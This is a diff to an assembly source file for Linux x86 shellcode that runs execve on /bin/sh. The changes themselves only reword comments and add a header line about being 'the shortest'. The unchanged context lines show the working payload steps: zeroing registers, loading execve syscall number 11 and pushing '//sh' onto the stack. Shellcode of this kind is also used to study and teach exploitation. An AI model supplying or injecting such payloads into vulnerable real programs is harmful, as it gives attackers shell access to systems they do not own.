@@ -1,6 +1,8 @@
     #
     # Execve /bin/sh Shellcode Via Push (Linux x86)
     #
+    # Dying to be the shortest.
+    #
     # Copyright (C) 2015 Gu Zhengxiong (rectigu@gmail.com)
     #
     # 18 February 2015
@@ -14,13 +16,13 @@ _start:
     # char *const argv[]
     xorl %ecx, %ecx
 
-    # mere 2 bytes, both %eax and %edx were zeroed
+    # 2 bytes, and both %eax and %edx were zeroed
     mull %ecx
 
     # __NR_execve 11
     movb $11, %al
 
-    # '\x00'
+    # for '\x00'
     pushl %ecx
     # 'h' 's' '/' '/'
     pushl $0x68732f2f
